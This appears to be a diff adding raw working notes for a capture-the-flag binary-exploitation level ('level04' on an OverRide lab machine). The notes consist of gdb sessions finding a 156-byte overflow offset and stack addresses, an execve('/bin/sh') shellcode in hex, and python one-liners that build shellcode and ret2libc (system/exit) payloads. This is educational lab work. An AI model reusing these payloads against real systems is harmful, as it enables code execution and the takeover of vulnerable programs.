@@ -321,3 +321,264 @@ void clear_stdin(void)
 
 
 
+
+
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level04/level04 
+Give me some shellcode, k
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
+child is exiting...
+[Inferior 1 (process 1835) exited normally]
+(gdb) r
+Starting program: /home/users/level04/level04 
+Give me some shellcode, k
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Give me some shellcode, k
+again ?
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+^C
+Program received signal SIGINT, Interrupt.
+0xf7fdb440 in __kernel_vsyscall ()
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level04/level04 
+Give me some shellcode, k
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+cxzcxz
+^C
+Program received signal SIGINT, Interrupt.
+0xf7fdb440 in __kernel_vsyscall ()
+
+
+level04@OverRide:~$ ./level04 
+Give me some shellcode, k
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
+child is exiting...
+level04@OverRide:~$ ./level04 
+Give me some shellcode, k
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Give me some shellcode, k
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Give me some shellcode, k
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Give me some shellcode, k
+^C
+level04@OverRide:~$ ./level04 
+Give me some shellcode, k
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+sadsad
+dsadsad
+dsad
+sadsad
+^C
+level04@OverRide:~$
+
+
+
+
+
+
+
+(gdb) set follow-fork-mode child
+(gdb) r
+Starting program: /home/users/level04/level04 
+[New process 1894]
+Give me some shellcode, k
+aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1894]
+0x4e4e4e4e in ?? ()
+
+4e -> N
+
+aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN
+
+[padding] + [address]
+└───┬───┘ + └───┬───┘
+	156	  +		4		= 160
+
+
+```
+\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+```
+size : 21
+
+
+[shellcode] + [padding] + [address]
+└────┬────┘ + └───┬───┘ + └───┬───┘
+	21		+	 135	+	  4		= 160
+
+
+
+find address to shellcode 
+```
+    gets(local_a0);
+```
+
+local_a0
+
+
+
+(gdb) b *0x0804875e
+Breakpoint 2 at 0x804875e
+(gdb) r
+Starting program: /home/users/level04/level04 
+Give me some shellcode, k
+c
+child is exiting...
+[Inferior 1 (process 1908) exited normally]
+(gdb) set follow-fork-mode child
+(gdb) r
+Starting program: /home/users/level04/level04 
+[New process 1911]
+Give me some shellcode, k
+[Switching to process 1911]
+
+Breakpoint 2, 0x0804875e in main ()
+(gdb) p $eax
+$1 = -10624
+(gdb) p eax
+No symbol table is loaded.  Use the "file" command.
+(gdb) p $esp-20x
+Invalid number "20x".
+(gdb) p $esp-0x20
+$2 = (void *) 0xffffd640
+(gdb) p $esp+0x20
+$3 = (void *) 0xffffd680
+(gdb) n $eax
+(gdb) x $eax
+0xffffd680:	0x00000000
+
+
+local_a0 <-> 0xffffd680
+
+
+0xffffd680
+\x80\xd6\xff\xff
+
+
+
+python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'a' * 135 + '\x80\xd6\xff\xff'"
+
+\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x80\xd6\xff\xff
+
+
+____________________
+
+(gdb) set follow-fork-mode child
+(gdb) b *0x08048763
+(gdb) r <<< $(python -c 'print "a" * 156 + "BBBB"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level04/level04 <<< $(python -c 'print "a" * 156 + "BBBB"')
+[New process 1911]
+Give me some shellcode, k
+[Switching to process 1911]
+
+Breakpoint 1, 0x08048763 in main ()
+
+(gdb) x/50x $esp
+0xffffd5e0:	0xffffd600	0x00000000	0x00000000	0x00000000
+0xffffd5f0:	0x00000b80	0x00000000	0xf7fdc714	0x00000000
+0xffffd600:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd610:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd620:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd630:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd640:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd650:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd660:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd670:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd680:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd690:	0x61616161	0x61616161	0x61616161	0x42424242
+0xffffd6a0:	0x00000000	0xffffd734
+
+
+0xffffd640
+\x40\xd6\xff\xff
+
+python -c 'print "\x90" * 135 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x40\xd6\xff\xff"'
+
+
+
+___________________________________________
+
+
+
+No current process: you must name one.
+(gdb) r <<< $(python -c 'print "a" * 156 + "BBBB"')
+Starting program: /home/users/level04/level04 <<< $(python -c 'print "a" * 156 + "BBBB"')
+[New process 1949]
+Give me some shellcode, k
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1949]
+0x42424242 in ?? ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) info proc map
+process 1949
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
+	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
+	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
+	0xf7e2b000 0xf7e2c000     0x1000        0x0 
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0 
+	0xf7fd8000 0xf7fda000     0x2000        0x0 
+	0xf7fda000 0xf7fdb000     0x1000        0x0 
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000, 0xf7fcc000 "/bin/sh"
+A syntax error in expression, near `"/bin/sh"'.
+(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+
+0xf7e6aed0
+
+0xf7f897ec
+
+
+
+python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1]'
+
+python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'
+
+python -c 'print "a" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'
+
+
+
+
+								(apres EIP = saved EIP)
+			  [saved EIP]	 + [ESP = ret adr]+ [ESP+4 = arg 1]
+[padding] + [address system] + [address exit] + [arg system]
+└───┬───┘ + └───────┬──────┘ + └──────┬─────┘ + └─────┬────┘
+   160	  +			4		 +		  4		  +		  4			  		
+
+
+
+
+
+
+
+
+
+
+
